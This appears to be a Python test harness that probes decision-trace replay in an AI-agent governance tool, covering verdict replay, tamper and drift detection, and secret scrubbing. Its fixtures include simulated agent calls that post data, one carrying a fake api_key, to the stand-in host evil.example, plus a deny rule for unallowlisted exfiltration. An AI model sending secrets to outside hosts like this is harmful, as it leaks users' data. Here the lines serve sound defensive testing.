#!/usr/bin/env python3
"""Break-first probes: decision-trace replay.

Target: gov/decision_replay.py + the executor's decision-trace capture
hook. Protocol idea adapted from microsoft/agent-governance-toolkit
(MIT license, credited not cloned -- see gov/decision_replay.py).

The property under test: every governed verdict (allow/deny/queue) is
re-verifiable from its recorded evidence alone. An auditor extracts
the ``decision_trace`` from the hash-chained audit-log verdict entry
and replays it against the deployed policy bundle -- no executor, no
network, no private runtime state.

RED-FIRST: pre-seam (no capture hook), probe p1_replayable_verdict
BREAKS: verdict entries carry policy_context / matched_rules but no
replayable trace -- mutate the logged inputs and NOTHING catches it
(the gap this lane closes). Post-seam every probe either replays to
the identical verdict or fails LOUD on tamper/drift.

Probe map (HELD / BREAK / EXPECTED / ERROR):
  p1_replayable_verdict  allow/deny/queue entries carry a trace that
                         replays to the identical verdict (and identical
                         per-rule outcomes)
  p2_tampered_input      flip a recorded input -> TraceTamperedError
                         naming the "request" section (never a silent
                         different verdict)
  p3_tampered_verdict    rewrite the recorded effect -> TraceTamperedError
                         naming the "verdict" section
  p4_policy_drift        replay against a changed rule set ->
                         PolicyDriftError (never a recomputed verdict)
  p5_version_mismatch    future trace_version -> TraceVersionError
  p6_no_raw_secrets      secret-bearing args leave only digests in the
                         trace; raw values appear nowhere in it
  p7_differential        replayer vs live engine agree on a sweep of
                         (action, context) pairs (verdict + per-rule)

Standalone: ~/workspace/.gov-venv/bin/python evals/decision_replay_probes.py
Determinism: fixed synthetic policy/material, fresh run dir per probe;
run twice (staging + clean env); verdicts must agree.
"""

import os
import sys
import copy
import json
import tempfile
import secrets
from pathlib import Path

os.environ.setdefault("GOV_DEPLOYMENT_MODE", "staging")
os.environ.setdefault("GOV_LOG_KEY", secrets.token_hex(32))

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
for _p in (REPO_ROOT, os.path.join(REPO_ROOT, "tests")):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from gov.policy import PolicyEngine  # noqa: E402
from gov.decision_contract import Request  # noqa: E402
from gov.log import ActionLog, read_entries  # noqa: E402
from gov.approvals import ApprovalQueue  # noqa: E402
from gov.executor import ToolExecutor  # noqa: E402
from gov import decision_replay as dr  # noqa: E402

RESULTS = []


def _report(name, verdict, detail):
    RESULTS.append({"verdict": verdict,
                    "detail": {"probe": name, "note": detail}})
    print("  %-26s %s  %s" % (name, verdict, detail), flush=True)


_POLICY = """\
version: 7
egress:
  domain_allowlist: [allowed.example]
roles:
  researcher: [read_file, send_email, http_post]
policies:
  - id: deny-exfil-unallowlisted
    effect: deny
    match:
      tool: [send_email, http_post]
      domain_allowlisted: false
    reason: test deny unallowlisted egress.
  - id: queue-outbound
    effect: require_approval
    match:
      tool: [send_email, http_post]
    reason: test queue outbound.
  - id: allow-reads
    effect: allow
    match:
      tool: [read_file]
    reason: test allow reads.
"""

_UNGOVERNED_ACK = ("decision-replay battery: synthetic red-team harness; "
                  "raw pre-wave-74/75 pipeline by design, declared "
                  "and chained")


def _tmpdir():
    td = os.environ.get("TMPDIR") or "/tmp/dr-battery"
    Path(td).mkdir(parents=True, exist_ok=True)
    return td


def _session():
    run_dir = Path(tempfile.mkdtemp(prefix="drb-", dir=_tmpdir()))
    policy = PolicyEngine.from_text(_POLICY, source_label="<dr-battery>")
    log = ActionLog(run_dir / "actions.jsonl")
    approvals = ApprovalQueue(run_dir, log)
    ex = ToolExecutor(run_dir, policy, log, approvals,
                      ledger_path=run_dir / "egress_ledger.jsonl",
                      ungoverned_ack=_UNGOVERNED_ACK)
    return {"run_dir": run_dir, "executor": ex, "policy": policy,
            "log": log, "approvals": approvals}


def _drive_verdicts(ctx):
    """Produce one allow, one deny, one queue; return verdict entries."""
    ex = ctx["executor"]
    ident = ex.mint_identity("agent-1", "researcher", "user-1")
    ex.call(ident, "read_file", path="notes.txt")
    ex.call(ident, "http_post", url="https://evil.example/collect",
            payload={"a": "b"})
    ex.call(ident, "send_email", to="boss@allowed.example",
            subject="hi", body="hello")
    out = []
    for ev in read_entries(ctx["run_dir"] / "actions.jsonl"):
        if isinstance(ev, dict) and ev.get("decision") in (
                "execution_authorized", "denied", "queued_pending"):
            out.append(ev)
    return out


def _bundle(ctx):
    return dr.policy_bundle_from_policy(ctx["policy"])


def _synthetic_trace():
    """A trace built from a live engine decision (no executor hook)."""
    policy = PolicyEngine.from_text(_POLICY, source_label="<dr-synth>")
    action = {"tool": "http_post", "role": "researcher",
              "agent_id": "agent-9",
              "args": {"url": "https://evil.example/x",
                       "payload": {"api_key": "tok_synth_9f2c4a1b7e"}}}
    ctx = {"domain_allowlisted": False, "counters": {}}
    decision = policy.decide(Request.from_action(action, ctx))
    trace = dr.build_trace(decision=decision, action=action,
                           context=ctx, policy=policy)
    bundle = dr.policy_bundle_from_policy(policy)
    return trace, bundle


# ---------------------------------------------------------------------------
# Probes
# ---------------------------------------------------------------------------

def p1_replayable_verdict():
    """Every verdict entry carries a trace replaying to the identical
    verdict (and identical per-rule outcomes)."""
    ctx = _session()
    entries = _drive_verdicts(ctx)
    if len(entries) != 3:
        return ("ERROR", "expected 3 verdict entries, got %d" % len(entries))
    missing = [e.get("decision") for e in entries
               if "decision_trace" not in e]
    if missing:
        # RED-FIRST: demonstrate the gap concretely. The logged entry
        # carries policy_context + matched_rules but nothing binds the
        # inputs to the verdict: flip a logged input and no mechanism
        # exists to catch it.
        victim = entries[0]
        mutated = copy.deepcopy(victim.get("policy_context") or {})
        if "domain_allowlisted" in mutated:
            mutated["domain_allowlisted"] = not mutated[
                "domain_allowlisted"]
        return ("BREAK",
                "verdict entries %r carry NO decision_trace: a verdict's "
                "inputs cannot be independently re-verified from the log "
                "alone (e.g. mutated policy_context.domain_allowlisted "
                "on the %r entry and nothing detects it)"
                % (missing, victim.get("decision")))
    bundle = _bundle(ctx)
    for e in entries:
        try:
            result = dr.replay(e["decision_trace"], bundle)
        except dr.ReplayError as exc:
            return ("BREAK", "%s entry trace failed to replay: %s: %s"
                    % (e.get("decision"), type(exc).__name__, exc))
        if result["verdict"] != {"execution_authorized": "allow",
                                 "denied": "deny",
                                 "queued_pending": "require_approval"}[
                                     e.get("decision")]:
            return ("BREAK", "%s entry replayed to %r"
                    % (e.get("decision"), result["verdict"]))
    return ("HELD", "3/3 verdict entries (allow/deny/queue) carry traces "
                    "that replay to the identical verdict + per-rule "
                    "outcomes")


def p2_tampered_input():
    """Flipping a recorded input fails LOUD, naming the section."""
    trace, bundle = _synthetic_trace()
    bad = copy.deepcopy(trace)
    bad["request"]["context"]["domain_allowlisted"] = True
    try:
        dr.replay(bad, bundle)
    except dr.TraceTamperedError as exc:
        if exc.section == "request":
            return ("HELD", "tampered input -> TraceTamperedError naming "
                            "section 'request' (no silent re-verdict)")
        return ("BREAK", "tampered input named wrong section %r"
                % exc.section)
    except dr.ReplayError as exc:
        return ("BREAK", "tampered input raised %s instead of "
                         "TraceTamperedError" % type(exc).__name__)
    return ("BREAK", "tampered input replayed WITHOUT any error: a "
                     "falsified input produced a verdict silently")


def p3_tampered_verdict():
    """Rewriting the recorded verdict fails LOUD, naming the section."""
    trace, bundle = _synthetic_trace()
    assert trace["verdict"]["effect"] == "deny"
    bad = copy.deepcopy(trace)
    bad["verdict"]["effect"] = "allow"
    try:
        dr.replay(bad, bundle)
    except dr.TraceTamperedError as exc:
        if exc.section == "verdict":
            return ("HELD", "rewritten verdict -> TraceTamperedError "
                            "naming section 'verdict'")
        return ("BREAK", "rewritten verdict named wrong section %r"
                % exc.section)
    except dr.ReplayError as exc:
        return ("BREAK", "rewritten verdict raised %s instead of "
                         "TraceTamperedError" % type(exc).__name__)
    return ("BREAK", "rewritten verdict replayed WITHOUT any error")


def p4_policy_drift():
    """Replaying against a changed rule set fails LOUD as drift."""
    trace, bundle = _synthetic_trace()
    drifted = copy.deepcopy(bundle)
    for rule in drifted["rules"]:
        if rule.get("id") == "deny-exfil-unallowlisted":
            rule["effect"] = "allow"
    try:
        dr.replay(trace, drifted)
    except dr.PolicyDriftError:
        pass
    except dr.ReplayError as exc:
        return ("BREAK", "drifted bundle raised %s instead of "
                         "PolicyDriftError" % type(exc).__name__)
    else:
        return ("BREAK", "drifted policy bundle replayed WITHOUT any "
                         "error: verdict recomputed under the wrong rules")
    # Version drift is a separate named failure.
    vdrifted = copy.deepcopy(bundle)
    vdrifted["policy_version"] = "999"
    try:
        dr.replay(trace, vdrifted)
    except dr.PolicyDriftError:
        return ("HELD", "rule-set drift AND version drift both -> "
                        "PolicyDriftError (no silent recomputation)")
    except dr.ReplayError as exc:
        return ("BREAK", "version drift raised %s instead of "
                         "PolicyDriftError" % type(exc).__name__)
    return ("BREAK", "version-drifted bundle replayed WITHOUT any error")


def p5_version_mismatch():
    """A future trace_version is refused explicitly, never guessed."""
    trace, bundle = _synthetic_trace()
    bad = copy.deepcopy(trace)
    bad["trace_version"] = 999
    try:
        dr.replay(bad, bundle)
    except dr.TraceVersionError as exc:
        if exc.trace_version == 999:
            return ("HELD", "trace_version=999 -> TraceVersionError "
                            "(explicit, not a wrong verdict)")
        return ("BREAK", "TraceVersionError carried wrong version")
    except dr.ReplayError as exc:
        return ("BREAK", "future version raised %s instead of "
                         "TraceVersionError" % type(exc).__name__)
    return ("BREAK", "future trace_version replayed WITHOUT any error")


def p6_no_raw_secrets():
    """Secret-bearing args leave only digests in the trace."""
    policy = PolicyEngine.from_text(_POLICY, source_label="<dr-secret>")
    secrets_map = {
        "password": "s3cr3t-p@ssw0rd-9f2c",
        "api_key": "tok_live_4a1b7e9f2c",
        "payload": {"token": "bearer-abc-123", "body": "raw payload bytes"},
        "to": "victim@allowed.example",
    }
    action = {"tool": "send_email", "role": "researcher",
              "agent_id": "agent-9",
              "args": dict({"subject": "x"}, **secrets_map)}
    ctx = {"domain_allowlisted": True, "counters": {}}
    decision = policy.decide(Request.from_action(action, ctx))
    trace = dr.build_trace(decision=decision, action=action,
                           context=ctx, policy=policy)
    blob = dr.canonical(trace)
    leaks = [v for v in ("s3cr3t-p@ssw0rd-9f2c", "tok_live_4a1b7e9f2c",
                         "bearer-abc-123", "raw payload bytes",
                         "victim@allowed.example") if v in blob]
    if leaks:
        return ("BREAK", "raw secret/PII/payload material in trace: %r"
                % leaks)
    # The digests must still be present (bounded references, not drops).
    if "$digest" not in blob:
        return ("BREAK", "scrubbed args left no digest placeholders")
    return ("HELD", "password/api_key/payload/to all digested; no raw "
                    "secret, key, PII, or payload bytes in the trace")


def p7_differential():
    """Replayer vs live engine agree on a sweep of (action, context)."""
    policy = PolicyEngine.from_text(_POLICY, source_label="<dr-diff>")
    bundle = dr.policy_bundle_from_policy(policy)
    tools = ["read_file", "send_email", "http_post", "unknown_tool"]
    roles = ["researcher", "support", None]
    ctxs = [
        {"domain_allowlisted": True, "counters": {}},
        {"domain_allowlisted": False, "counters": {}},
        {"domain_allowlisted": False,
         "counters": {"http_post": 3, "send_email": 1}},
        {"domain_allowlisted": True, "path_outside_sandbox": True,
         "counters": {}},
        {},
    ]
    n = 0
    for tool in tools:
        for role in roles:
            for ctx in ctxs:
                action = {"tool": tool, "role": role,
                          "agent_id": "diff-agent",
                          "args": {"path": "a/secret-notes.txt",
                                   "url": "https://evil.example/x"}}
                decision = policy.decide(Request.from_action(action, ctx))
                trace = dr.build_trace(decision=decision, action=action,
                                       context=ctx, policy=policy)
                try:
                    result = dr.replay(trace, bundle)
                except dr.ReplayError as exc:
                    return ("BREAK", "differential divergence at "
                                     "tool=%r role=%r ctx=%r: %s: %s"
                            % (tool, role, ctx, type(exc).__name__, exc))
                if result["verdict"] != decision.effect:
                    return ("BREAK", "verdict mismatch at tool=%r role=%r"
                            % (tool, role))
                n += 1
    return ("HELD", "%d (action, context) pairs: replayer and engine "
                    "agree on verdict + every per-rule outcome" % n)


def main():
    print("decision-trace replay probes (staging pin at module level)")
    _report("p1_replayable_verdict", *p1_replayable_verdict())
    _report("p2_tampered_input", *p2_tampered_input())
    _report("p3_tampered_verdict", *p3_tampered_verdict())
    _report("p4_policy_drift", *p4_policy_drift())
    _report("p5_version_mismatch", *p5_version_mismatch())
    _report("p6_no_raw_secrets", *p6_no_raw_secrets())
    _report("p7_differential", *p7_differential())
    held = sum(1 for r in RESULTS if r["verdict"] == "HELD")
    brk = sum(1 for r in RESULTS if r["verdict"] == "BREAK")
    err = sum(1 for r in RESULTS if r["verdict"] == "ERROR")
    exp = sum(1 for r in RESULTS if r["verdict"] == "EXPECTED")
    print("score: %d HELD / %d BREAK / %d ERROR / %d EXPECTED"
          % (held, brk, err, exp))
    with open(os.path.join(_tmpdir(), "decision_replay_results.json"),
              "w") as fh:
        json.dump(RESULTS, fh, indent=2, sort_keys=True)
    return 1 if (brk or err) else 0


if __name__ == "__main__":
    sys.exit(main())
